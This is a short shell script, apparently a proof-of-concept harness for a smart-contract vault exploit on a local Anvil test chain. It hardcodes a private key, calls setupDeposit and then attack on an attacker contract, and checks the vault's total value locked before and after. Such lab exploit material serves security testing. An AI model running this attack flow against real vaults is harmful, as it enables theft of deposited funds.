#!/bin/sh
ATTACKER=$(cat /shared/deploy-addresses.json | jq -r .Attacker)
VAULT=$(cat /shared/deploy-addresses.json | jq -r .Vault)
PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
RPC=http://anvil:8545

echo "TVL 1:"
cast send $VAULT "totalTVL()(uint256)" --rpc-url $RPC

echo "Setup Deposit:"
cast send $ATTACKER "setupDeposit(uint256)" 10000000000000000000 --private-key $PK --rpc-url $RPC

echo "TVL 2:"
cast send $VAULT "totalTVL()(uint256)" --rpc-url $RPC

echo "Attack:"
cast send $ATTACKER "attack(uint256)" 10000000000000000000 --private-key $PK --rpc-url $RPC

echo "TVL 3:"
cast send $VAULT "totalTVL()(uint256)" --rpc-url $RPC
